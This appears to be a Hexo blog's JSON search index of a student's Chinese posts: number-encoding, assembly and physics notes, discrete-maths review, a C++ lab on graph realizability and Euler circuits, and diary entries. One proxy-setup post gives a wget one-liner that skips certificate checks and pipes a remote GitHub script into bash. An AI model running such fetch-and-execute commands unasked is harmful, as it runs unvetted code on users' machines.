[1111 1110]反 = [1111 1111]反 = [1000 0000]原 = -0 发现用反码计算减法, 结果的真值部分是正确的. 而唯一的问题其实就出现在”0”这个特殊的数值上. 虽然人们理解上 +0 和 -0 是一样的, 但是0带符号是没有任何意义的. 而且会有[0000 0000]原和[1000 0000]原两个编码表示0. 于是补码的出现, 解决了0的符号以及两个编码的问题: 1-1 = 1 + (-1) = [0000 0001]原 + [1000 0001]原 = [0000 0001]补 + [1111 1111]补 = [0000 0000]补=[0000 0000]原 这样0用[0000 0000]表示, 而以前出现问题的-0则不存在了.而且可以用[1000 0000]表示-128: (-1) + (-127) = [1000 0001]原 + [1111 1111]原 = [1111 1111]补 + [1000 0001]补 = [1000 0000]补 -1-127的结果应该是-128, 在用补码运算的结果中,[1000 0000]补 就是-128. 但是注意因为实际上是使用以前的-0的补码来表示-128, 所以-128并没有原码和反码表示.(对-128的补码表示[1000 0000]补算出来的原码是[0000 0000]原, 这是不正确的) 使用补码, 不仅仅修复了0的符号以及存在两个编码的问题, 而且还能够多表示一个最低数. 这就是为什么8位二进制, 使用原码或反码表示的范围为[-127, +127], 而使用补码表示的范围为[-128, 127]. 因为机器使用补码, 所以对于编程中常用到的32位int类型, 可以表示范围是: [-231, 231-1] 因为第一位表示的是符号位.而使用补码表示时又可以多保存一个最小值.","link":"/2021/11/21/%E6%9C%BA%E5%99%A8%E6%95%B0%20%E7%9C%9F%E5%80%BC%20%E5%8E%9F%E7%A0%81%20%E5%8F%8D%E7%A0%81%20%E8%A1%A5%E7%A0%81/"},{"title":"汇编指令","text":"jump指令用作跳转 je jmp equal 相等时跳转 jne jmp not equal 不等时跳转 jz jmp (when) zf(1) zf为1时跳转 ZF（zero flag）:零标志，最近操作结果为0（列如 逻辑操作 等）ZF=0（结果为0，ZF就置1） jnz jmp zf=0 zf为0时跳转 jg jmp if greater 前 &gt; 后 jge jmp if greater or equal 前 &gt;= 后 ja jmp above 大于转移 jb jmp below 小于转移 jl jmp low 小于转移 cmp指令CMP（比较）指令执行从目的操作数中减去源操作数的隐含减法操作，并且不修改任何操作数 CMP destination,source 当实际的减法发生时，CMP 指令按照计算结果修改溢出、符号、零、进位、辅助进位和奇偶标志位。 如果比较的是两个无符号数，则零标志位和进位标志位表示的两个操作数之间的关系如右表所示： CMP结果 ZF CF 目的操作数 &lt; 源操作数 0 1 目的操作数 &gt; 源操作数 0 0 目的操作数 = 源操作数 1 0 如果比较的是两个有符号数，则符号标志位、零标志位和溢出标志位表示的两个操作数之间的关系如右表所示： CMP结果 标志位 目的操作数 &lt; 源操作数 SF ≠ OF 目的操作数 &gt; 源操作数 SF=OF 目的操作数 = 源操作数 ZF=1 地址传送指令 lea 装入有效地址 移位指令 sar 算术右移 (每位右移，低位进 CF，高位不变) shr 逻辑右移（每位右移，低位进 CF，高位补 0）","link":"/2021/12/18/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"},{"title":"物理复习笔记","text":"光学常用单位换算1m =&gt; 10^3^mm =&gt; 10^6^μm =&gt; 10^9^nm 光程差 杨氏双缝干涉 牛顿环 电磁学电场线 电场强度由电场线的疏密程度体现，电场场强越大，电场线越密集 电场线方向体现电势降落方向，由图中电场线方向与等势面可判断 电容器 电场强度 电场强度通量 常见带电梯的电场强度 高斯定理求电场强度 电势与电势能电势 电势能 电介质电介质中的高斯定理 高斯定理的成立与否与电介质的具体分布没有关系 例题： 电场能 电流密度 磁感应强度毕奥-萨伐尔定律 安培环路定理","link":"/2022/01/03/%E7%89%A9%E7%90%86%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"离散复习","text":"第七章 图图的基本概念相邻 关联 简单图不含平行边和环的图 零图无边 正则图正则图是每个顶点都有相同数目的邻居的图，即每个顶点的度相同。若每个顶点的度均为 $k$，称为 $k-$ 正则图。 二部图二部图又叫二分图，是图论中的一种特殊模型。设G=(V,E)是一个无向图，如果顶点V可分割为两个互不相交的子集(A,B)，并且图中的每条边（i，j）所关联的两个顶点i和j分别属于这两个不同的顶点集(i in A,j in B)，则称图G为一个二分图。简单来说，如果图中点可以被分为两组，并且使得所有边都跨越组的边界，则这就是一个二分图。准确地说：把一个图的顶点划分为两个不相交子集 ，使得每一条边都分别连接两个集合中的顶点。如果存在这样的划分，则此图为一个二分图，如下图所示的六个图全都是二分图： 定理：G为二部图的充要条件是G中的每一个圈的长度都是偶数 彼得森图 补图图G的补图，通俗的来讲就是完全图 $K_n$ 去除G的边集后得到的图$K_n-G$ 图的同构 自补图其补图与自身同构 距离距离$d(u,v): u,v$之间短线程的长度. 规定：$u,v$不连通时,$d(u,v)=\\infty$ 直径G的直径$d(G): max{d(u,v)|u,v \\in V(G)}$ 周长与围长在含圈的无向简单图G中，称 $G$ 中最长圈的长度为 $G$ 的周长，记作 $c(G)$ , 称 $G$ 中最短圈的长度为 $G$ 的围长， 记为 $g(G)$. 握手定理 推论： 在任何图中，奇数度顶点的个数是偶数 扩大路径法 点连通度 边连通度 Whitney定理$κ ≤λ≤δ$ 有向图的三个连通性 桥对于无向图,如果删除了一条边,整个图的联通分量数量变化,则这条边称为桥如图,红色标注的线就是该图的一条桥(顶点3和顶点5的边). 块不含割点的极大连通子图 第八章 欧拉图与哈密顿图本地文件 博客网址 第九章 树树的6个等价定义 生成树 生成树的存在性定理 基本回路，环路空间，基本割集，断集空间 基本回路：生成树 + 一条弦 = 回路 环路空间：所有回路的对称差的集 基本割集：去掉的树枝 + 连接分开的两部分的弦(桥) 断集空间：所有割集的对称差的集 G的生成树的个数$\\tau(G)$ 根数 只有一个树根的树 第十章 图的矩阵表示本地文件 博客连接 第十一章 平面图本地文件 博客链接 第十二章 图的着色着色 常见图的点色数 Brooks 定理 Vizing 定理 五色定理 色多项式 完全图的色多项式 求色多项式 例子，简单来说就是一个加边，一个覆盖点，凑正则图 第十三章 支配集、覆盖集、独立集与匹配集本地文件 博客链接","link":"/2022/01/05/%E7%A6%BB%E6%95%A3%E5%A4%8D%E4%B9%A0/"},{"title":"离散数学实验一","text":"离散数学 II 实验一（实验报告）20020007095-叶鹏 盛艳秀-老师 实验题目可简单图化、连通图、欧拉图和哈密顿图的判断 实验目的 掌握可简单图化的定义及判断方法； 掌握连通图、欧拉图的判断方法； 掌握欧拉回路的搜索方法； 了解欧拉图的实际应用。 实验要求 给定一非负整数序列（例如：(4,2,2,2,2)）。 判断此非负整数序列是否是可图化的，是否是可简单图化的。 如果是可简单图化的，根据 Havel 定理过程求出对应的简单图，并输出此图。 判断此简单图是否是连通的。 如果是连通图，判断此图是否是欧拉图。如果是欧拉图，请输出一条欧拉回路（输出形式如：v2-&gt;v1-&gt;v5-&gt;v3-&gt;v4-&gt;v5-&gt;v2）。*说明：要求学生设计的程序不仅对给定非负整数序列得出正确结果，还要对教师测试数据集得出正确结果。 实验内容和实验步骤 考虑到要读入度数序列，每个节点有相应的索引值，因此定义一个结构体 node 来储存对应内容 所有函数，成员皆在类内定义，因此创建 solution 类 main 函数中实例化类，读入并初始化度数序列 判断此度数列是否可图化、可简单图化，如果度数和为基数，则不可图化，也不能简单图化。如果可图化，继续判断是否可简单图化，先判断最大度是否小于等于n-1，不满足则不可简单图化， 接着使用Havel的等价定理 d1 + d2 + … + dn = 0 (mod 2) d1 + d2 + … + dr ≤ r(r-1) + min(r,dr+1) + min(r,dr+2) + … + min(r,dn) 满足以上二条件，则可简单图化 Havel定理分步求简单图 Havel定理构造简单图，用邻接矩阵表示，采用贪心思想构造出最简的简单图 求从1 ~ n-1的邻接矩阵幂之和B~n-1~，若B~n-1~中不存在0，则说明n个节点都至少存在一条长度为1 ~ n-1的通路到另一节点，说明图连通，反之说明不连通 如果图连通，检查度数列，记录奇数顶点数，若存在奇数顶点，则说明不存在欧拉回路，若没有奇数顶点，再进行下一步判断 Fleury算法求欧拉回路，如非不要不走割边，搜索不是割边的边并扩展，如果没有点可以扩展，输出并出栈，否则 dfs 继续搜索欧拉路径 程序结束 实验测试数据、代码及相关结果分析源代码程序代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;stack&gt;using namespace std;const int maxn = 50;struct Node { int id, degree;};bool cmp(Node a, Node b) { return a.degree &gt; b.degree;}int tem[maxn][maxn];class solution {public: bool canSimpleGraphRealization; bool isConnected; Node* node = new Node[maxn]; int stk[maxn]; int n; int top; int adjMatrix[maxn][maxn]; int sumLink[maxn][maxn]; //constructor solution(int n) { this-&gt;n = n; this-&gt;canSimpleGraphRealization = false; this-&gt;isConnected = true; memset(adjMatrix, 0, sizeof(adjMatrix)); memset(sumLink, 0, sizeof(sumLink)); memset(tem, 0, sizeof(tem)); } ~solution() { delete[] node; } void display(Node* node); void initialList() { cout &lt;&lt; endl; cout &lt;&lt; &quot;#==========读入度数序列&quot; &lt;&lt; endl; cout &lt;&lt; endl; for (int i = 1; i &lt;= n; i++) { cin &gt;&gt; node[i].degree; node[i].id = i; } } void copyList(Node* targetNode) { for (int i = 1; i &lt;= n; i++) { targetNode[i].degree = node[i].degree; targetNode[i].id = node[i].id; } } void checkGraphRealization(Node* node, int n); void Havel(Node* node, int n); bool allZERO(Node* node, int s, int n); bool buildSimpleGraph(Node* node, int n); void checkConnected(Node* node, int n); void clearTemLink(); void fleury(int startIndex); void dfs(int x);};//displaydegreevoid solution::display(Node* node) { for (int i = 1; i &lt;= n; i++) { cout &lt;&lt; &quot;degree[&quot; &lt;&lt; i &lt;&lt; &quot;]&quot; &lt;&lt; &quot;= &quot; &lt;&lt; node[i].degree &lt;&lt; endl; }}void solution::checkGraphRealization(Node* node, int n) { cout &lt;&lt; endl; cout &lt;&lt; &quot;#==========判断是否可图化/可简单图化&quot; &lt;&lt; endl; cout &lt;&lt; endl; int sum = 0; //先判断是否可图化 for (int i = 1; i &lt;= n; i++) { sum += node[i].degree; } if (sum % 2) { cout &lt;&lt; &quot;不可图化，亦不可简单图化&quot; &lt;&lt; endl; return; } //如果可图化，继续判断是否可简单图化 cout &lt;&lt; &quot;可图化&quot;; sort(node + 1, node + n + 1, cmp); //先判断最大度是否小于等于n-1 if (node[0].degree &gt; n - 1) { cout &lt;&lt; &quot;,不可简单图化&quot; &lt;&lt; endl; return; } else { for (int r = 1; r &lt;= n; r++) { int left = 0; for (int index = 1; index &lt;= r; index++) { left += node[index].degree; } int right = r * (r - 1); for (int index = r + 1; index &lt;= n; index++) { right += min(r, node[index].degree); } //如果不满足 if (left &gt; right) { cout &lt;&lt; &quot;,不可简单图化&quot; &lt;&lt; endl; return; } } } //如果都没问题，则可以简单图化 cout &lt;&lt; &quot;,可简单图化&quot; &lt;&lt; endl; canSimpleGraphRealization = true;}void solution::Havel(Node* node, int n) { cout &lt;&lt; endl; cout &lt;&lt; &quot;#==========Havel定理求对应简单图&quot; &lt;&lt; endl; cout &lt;&lt; endl; Node* fakeNode = new Node[n+1]; copyList(fakeNode); int lptr, rptr; lptr = 1; rptr = n; cout &lt;&lt; &quot;(&quot;; for (int i = lptr; i &lt;= rptr; i++) { cout &lt;&lt; fakeNode[i].degree; if (i != rptr) cout &lt;&lt; &quot;, &quot;; } cout &lt;&lt; &quot;)&quot;; cout &lt;&lt; &quot;可简单图化&quot; &lt;&lt; endl; while (!allZERO(fakeNode, lptr, rptr)) { //cout &lt;&lt; endl &lt;&lt; &quot;lptr=&quot; &lt;&lt; lptr &lt;&lt; endl; for (int i = lptr + 1; i &lt;= lptr + fakeNode[lptr].degree; i++) { fakeNode[i].degree -= 1; } //cout &lt;&lt; &quot;before &quot;; //display(); sort(fakeNode+1+lptr, fakeNode+1+n, cmp); lptr++; //cout &lt;&lt; &quot;after &quot;; //display(); cout &lt;&lt; &quot;&lt;=&gt;&quot;; cout &lt;&lt; &quot;(&quot;; for (int i = lptr; i &lt;= rptr; i++) { cout &lt;&lt; fakeNode[i].degree; if (i != rptr) cout &lt;&lt; &quot;, &quot;; } cout &lt;&lt; &quot;)&quot;; cout &lt;&lt; &quot;可简单图化&quot; &lt;&lt; endl; } delete[] fakeNode;}bool solution::allZERO(Node* node, int s, int n) { int sum = 0; for (int i = s; i &lt;= n; i++) { sum += node[i].degree; } if (!sum) return true; else return false;}bool solution::buildSimpleGraph(Node* node, int n){ cout &lt;&lt; endl; cout &lt;&lt; &quot;#==========Havel定理构造对应简单图(邻接矩阵)&quot; &lt;&lt; endl; cout &lt;&lt; endl; Node* fakeNode = new Node[n + 1]; copyList(fakeNode); //display(fakeNode); for (int i = 1; i &lt;= n; i++) { sort(fakeNode + i, fakeNode + n + 1, cmp); if (fakeNode[i].degree &gt; n - i) return false; for (int j = i + 1; j &lt;= i + fakeNode[i].degree; j++) { if (!fakeNode[j].degree) return false; fakeNode[j].degree--; adjMatrix[fakeNode[i].id][fakeNode[j].id] = 1; adjMatrix[fakeNode[j].id][fakeNode[i].id] = 1; } fakeNode[i].degree = 0; } cout &lt;&lt; &quot;index&quot;; for (int i = 1; i &lt;= n; i++) { printf(&quot;%5d&quot;, i); } cout &lt;&lt; endl &lt;&lt; endl; for (int i = 1; i &lt;= n; i++) { printf(&quot;%5d&quot;, i); for (int j = 1; j &lt;= n; j++) { printf(&quot;%5d&quot;, adjMatrix[i][j]); } cout &lt;&lt; endl; } delete[] fakeNode; return true;}void solution::clearTemLink() { for (int i = 1; i &lt;= n; i++) { for (int j = 1; j &lt;= n; j++) { tem[i][j] = adjMatrix[i][j]; } }}void solution::checkConnected(Node* node, int n){ cout &lt;&lt; endl; cout &lt;&lt; &quot;#==========检查图是否连通&quot; &lt;&lt; endl; cout &lt;&lt; endl; for (int t = 1; t &lt; n; t++) { clearTemLink(); int tt = t; while (tt-1) { int ans[maxn][maxn]; memset(ans, 0, sizeof(ans)); for (int i = 1; i &lt;= n; i++) { for (int j = 1; j &lt;= n; j++) { for (int k = 1; k &lt;= n; k++) { ans[i][j] += adjMatrix[i][k] * tem[k][j]; } } } for (int i = 1; i &lt;= n; i++) { for (int j = 1; j &lt;= n; j++) { tem[i][j] = ans[i][j]; } } tt--; } cout &lt;&lt; &quot;A^&quot; &lt;&lt; t &lt;&lt; &quot; = &quot; &lt;&lt; endl; for (int i = 1; i &lt;= n; i++) { for (int j = 1; j &lt;= n; j++) { printf(&quot;%5d&quot;, tem[i][j]); } cout &lt;&lt; endl; } cout &lt;&lt; endl; for (int i = 1; i &lt;= n; i++) { for (int j = 1; j &lt;= n; j++) { sumLink[i][j] += tem[i][j]; } } } cout &lt;&lt; &quot;B^&quot; &lt;&lt; n - 1 &lt;&lt; &quot; = &quot; &lt;&lt; endl; for (int i = 1; i &lt;= n; i++) { for (int j = 1; j &lt;= n; j++) { printf(&quot;%5d&quot;, sumLink[i][j]); } cout &lt;&lt; endl; } for (int i = 1; i &lt;= n &amp;&amp; isConnected; i++) { for (int j = 1; j &lt;= n &amp;&amp; isConnected; j++) { if (i != j) { if (sumLink[i][j] == 0) { cout &lt;&lt; endl &lt;&lt; &quot;不连通&quot; &lt;&lt; endl; isConnected = false; } } } } if (isConnected) { cout &lt;&lt; endl &lt;&lt; &quot;连通&quot; &lt;&lt; endl; }}void solution::dfs(int x) { stk[top++] = x; for (int i = 1; i &lt;= n; ++i) { if (adjMatrix[x][i]) { adjMatrix[x][i] = adjMatrix[i][x] = 0; // 删除此边 dfs(i); break; } }}void solution::fleury(int startIndex) { cout &lt;&lt; endl; cout &lt;&lt; &quot;#==========搜索欧拉回路&quot; &lt;&lt; endl; cout &lt;&lt; endl; //cout &lt;&lt; &quot;start = &quot; &lt;&lt; startIndex &lt;&lt; endl; int brige; top = 0; stk[top++] = startIndex; // 将起点放入Euler路径中 while (top &gt; 0) { brige = 1; for (int i = 1; i &lt;= n; ++i) { // 试图搜索一条边不是割边（桥） if (adjMatrix[stk[top - 1]][i]) { brige = 0; break; } } if (brige) { // 如果没有点可以扩展，输出并出栈 cout &lt;&lt; &quot;v&quot; &lt;&lt; stk[--top] &lt;&lt; &quot; -&gt; &quot;; } else { // 否则继续搜索欧拉路径 dfs(stk[--top]); } } cout &lt;&lt; &quot;done.&quot; &lt;&lt; endl;}int main() { cout &lt;&lt; &quot;#==========读入序列长度&quot; &lt;&lt; endl; cout &lt;&lt; endl; int n; int oddNum = 0; cout &lt;&lt; &quot;n = &quot;; cin &gt;&gt; n; solution method(n); method.initialList(); method.checkGraphRealization(method.node, n); //如果可简单图化，根据 Havel 定理过程求出对应的简单图，并输出此图 if (method.canSimpleGraphRealization) { method.Havel(method.node, n); //如果可简单图化，根据 Havel 定理构造对应简单图 if (method.canSimpleGraphRealization)method.buildSimpleGraph(method.node, n); //检查是否连通 method.checkConnected(method.node, n); //连通，求欧拉回路 int startIndex = 1; //method.display(); if (method.isConnected) { for (int i = 1; i &lt;= n; i++) { if (method.node[i].degree % 2) { oddNum++; startIndex = i; } } cout &lt;&lt; endl; cout &lt;&lt; &quot;#==========检查是否有欧拉回路&quot; &lt;&lt; endl; cout &lt;&lt; endl; if (oddNum == 0) { cout &lt;&lt; &quot;有欧拉回路！&quot; &lt;&lt; endl; method.fleury(startIndex); } else { cout &lt;&lt; &quot;没有欧拉回路！&quot; &lt;&lt; endl; } } } return 0;} 测试数据从民间收集了5个具有代表性的测试数据 case 1 input3, 3, 2, 2, 1 output case 2 input3, 3, 2 output case 3 input1, 1, 1, 1 output case 4 input3, 2, 2, 1 output case 5 input3, 2, 2, 1 output 实验总结本次实验，通过动手编写程序，掌握了可简单图化的定义，连通图、欧拉图的判断方法，欧拉回路的搜索方法，熟悉了Havel定理以及Fleury算法，首次系统地将离散数学的理论知识应用到程序实践上，加深对图论知识的印象，锻炼了代码能力。","link":"/2021/12/15/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E5%AE%9E%E9%AA%8C%E4%B8%80/"},{"title":"科学上网","text":"基于VPS搭建SSR服务器购买VPS2021年最好的国外VPS推荐 - 十佳评测 国外便宜高性价比和免费白嫖 VPS 推荐 部署VPS具体信息登录自己的vps服务网站查询 PuTTY远程安装SSR一键安装脚本wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh SSR节点导入输入ssr配置信息即可 开启代理全局模式顾名思义。电脑上的大部分网络请求都要经过魔法上网的工具，也就是全局代理的意思。 PAC模式这个模式是根据PAC文件，来判断请求是否要经过代理。 直连模式这个模式要配合一些高级的设置来使用，单独设置这个模式的话，一般不会起作用。除非单独为某个程序设置代理信息","link":"/2021/11/28/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"title":"触发器","text":"触发器 触发器有两个互补的输出端 $Q$ 和 $\\overline{Q}$ 有两个稳定状态 1 和 0 1状态：$Q = 1\\quad\\overline{Q} = 0$ 0状态：$Q = 0\\quad\\overline{Q} = 1$ 现态：输入信号作用前的状态 记作$Q$ 和 $\\overline{Q}$ 次态：输入信号作用后的状态 记作 $Q^{n+1}$ 和 $\\overline{Q^{n+1}}$ 触发器常用的描述方法 功能表 状态表 状态图 次态方程 激励表 卡诺图 功能表反映了触发器在不同输入下对应功能的表格 状态表反映了触发器在输入作用下现态和次态之间的转移关系 激励表反映了触发器从现态 $Q$ 转移到某种次态 $Q^{n+1}$ 时，对输入信号的要求 状态图反应触发器两种状态之间转移关系的有向图 圆圈表示稳定状态 有向线段表示状态转移的方向 起点：现态 终点：次态 触发条件 卡诺图根据触发器的功能表或状态表所得到的反映触发器次态和现态以及输入关系的卡诺图 次态方程反应触发器次态和现态以及输入关系的表达式 次态方程 $Q^{n+1}=\\overline{S}+RQ$ 约束方程 $R+S=1$ 基本R-S触发器 构成各种功能触发器的基本部件 R：置0端或复位端 S：置1端或置位端 功能表与状态表 状态表与激励表 状态表、状态图、卡诺图、次态方程、约束方程","link":"/2021/12/20/%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"title":"计基复习","text":"纲要本地文件 第一章 计算机系统概述世界上第一台电子数字计算机 冯·诺依曼计算机的基本思想 储存程序 CPU区分指令和数据 从时间来说：取指令事件发生在“取指周期”；取数据事件发生在“执行周期”。 从空间来说：取出的二进制代码是指令，一定送往指令寄存器（控制器）；取出的二进制代码是数据，一定送往数据寄存器（运算器）。 计算机软件 系统软件 应用软件 源程序到可执行目标文件的转换过程 计算机系统抽象层(层次化结构) ISA 微架构 应用程序员与系统程序员 性能指标 CPI IPS 第二章 数据的机器级表示与处理进制转换小数 × $n$ 取整即可 原码、补码、反码、移码本地文件 博客链接 IEEE 754浮点数标准 相互转换 大端方式和小端方式 位扩展及位截断 第三章 程序的转换及机器级表示三种指令 微指令：微指令是微程序级命令，属于硬件范畴 伪指令：伪指令是由若干机器指令组成的指令序列，属于软件范畴 机器指令：机器指令介于二者之间，处于硬件和软件的交界面 IA-32各类寻址方式","link":"/2022/01/06/%E8%AE%A1%E5%9F%BA%E5%A4%8D%E4%B9%A0/"},{"title":"近来的一些状况","text":"最近发生了很多很多事情，让我感觉我的人生充满戏剧性，先码一下，把程序赶完再回来写 —-11-08—- 累，真的很累，当初想让自己忙起来，这样就可以不去想某些人，某些事，能让自己从痛苦中摆脱出来，但是现在唯一的感觉就是累，漫无目的的累，不明所以的累，在忙完自己所认定的一件事以后，收获的不是满足，反而是空虚，以及不知道该做什么的无奈。感觉有好多事要做，不知道从哪里下手，不知道该听谁的话，我只是觉得自己像一台机器，大脑中只存放指令，除此之外找不到像人的证据了。","link":"/2021/11/07/%E8%BF%91%E6%9D%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E7%8A%B6%E5%86%B5/"},{"title":"Jan-2nd","text":"我已经许久没有更新过博客了，上一次的文章还是在两个月前，我注意到我的博客运行了一年多，我很兴奋，我觉得我应该继续坚持这个习惯下去 结果就是两个月来我你妈啥玩意儿一篇都没写，混吃等死 新的一年2023，今天是1月2日，距离上次跨年不到两天，距离下次跨年不到一年，我得说，虽然我什么都没写，但是这两个月还是发生了很多事情，我先从最近开始说起 很显然的啊，我把我的博客换了个主题，next不错就是太无聊了，我似乎是在查资料的时候看到别人的博客很酷炫，想到其实我自己也可以换一个，我就看中了这个icarus，赛博朋克风格的，我觉得做的很漂亮，于是花了两天的时间，里里外外把我的博客翻新了一下，新的主题新的看板娘，我甚至昨晚还去申请了域名备案，这样以后申请投放到搜索引擎上，我写的东西说不定能被搜到，但是今早腾讯给我打电话我个懒狗还在做梦没听见，错过了三通腾讯云的电话，看来只能等明天了 我刚刚想到一个问题，我备案的时候用的是我腾讯云的服务器绑定，但我博客是用 github page 搭建的，这不会有啥冲突吧 有冲突就明天再想吧 最近真的是懒得一批，尤其是回家以后，回家的一两天还跟着视频学了会Vue+Electron，然后洗了个澡就阳了，阳了以后就他妈的死在床上，起都起不来，折腾了一个多星期才好点，床上瘫着的时候啥事都不做，把能看的视频都看了最后躺床上无聊的一批，感觉还是呆在学校比较有意思，在家太无聊，打游戏也没劲，学习也没劲，特别是差不多能下床的那几天，每天担心这个担心那个，留了一屁股的作业但就是不想写，不敢开电脑，开电脑就想着作业烦的一批，最终就是啥也没干成，这两天稍微好点，跟同学打了会游戏，不跟人说话我感觉我就要死了，最终是昨天还是前天打开电脑继续学了一会，看到别人的博客帅气的万批，然后把自己的也整了整","link":"/2023/01/02/Jan-2nd/"},{"title":"Jan-10th","text":"等了一个星期，终于把域名备案整完了","link":"/2023/01/10/Jan-10th/"}],"tags":[{"name":"杂","slug":"杂","link":"/tags/%E6%9D%82/"},{"name":"Android Studio","slug":"Android-Studio","link":"/tags/Android-Studio/"},{"name":"C#","slug":"C","link":"/tags/C/"},{"name":"algorithm","slug":"algorithm","link":"/tags/algorithm/"},{"name":"汇编语言","slug":"汇编语言","link":"/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"OUCpass","slug":"OUCpass","link":"/tags/OUCpass/"},{"name":"ACM","slug":"ACM","link":"/tags/ACM/"},{"name":"C++","slug":"C","link":"/tags/C/"},{"name":"miniProgram","slug":"miniProgram","link":"/tags/miniProgram/"},{"name":"mobileProgram","slug":"mobileProgram","link":"/tags/mobileProgram/"},{"name":"node","slug":"node","link":"/tags/node/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"Algorithm","slug":"Algorithm","link":"/tags/Algorithm/"},{"name":"Program","slug":"Program","link":"/tags/Program/"},{"name":"概率论","slug":"概率论","link":"/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"图论","slug":"图论","link":"/tags/%E5%9B%BE%E8%AE%BA/"},{"name":"English","slug":"English","link":"/tags/English/"},{"name":"计算机系统基础","slug":"计算机系统基础","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"},{"name":"大学物理","slug":"大学物理","link":"/tags/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/"},{"name":"数字电子技术","slug":"数字电子技术","link":"/tags/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/"}],"categories":[{"name":"日志","slug":"日志","link":"/categories/%E6%97%A5%E5%BF%97/"},{"name":"学习","slug":"学习","link":"/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"开发日志","slug":"开发日志","link":"/categories/%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/"},{"name":"题解","slug":"题解","link":"/categories/%E9%A2%98%E8%A7%A3/"},{"name":"SofrWareDesign-2022","slug":"SofrWareDesign-2022","link":"/categories/SofrWareDesign-2022/"},{"name":"心得","slug":"心得","link":"/categories/%E5%BF%83%E5%BE%97/"},{"name":"Study","slug":"Study","link":"/categories/Study/"}],"pages":[{"title":"关于","text":"个人介绍 弱智 中国海洋大学，本科 计算机爱好者 HARDCORE is my law +-×÷σ","link":"/about/index.html"},{"title":"资源","text":"","link":"/resources/index.html"},{"title":"分类","text":"","link":"/categories/index.html"},{"title":"日历","text":"","link":"/schedule/index.html"},{"title":"标签","text":"","link":"/tags/index.html"}]}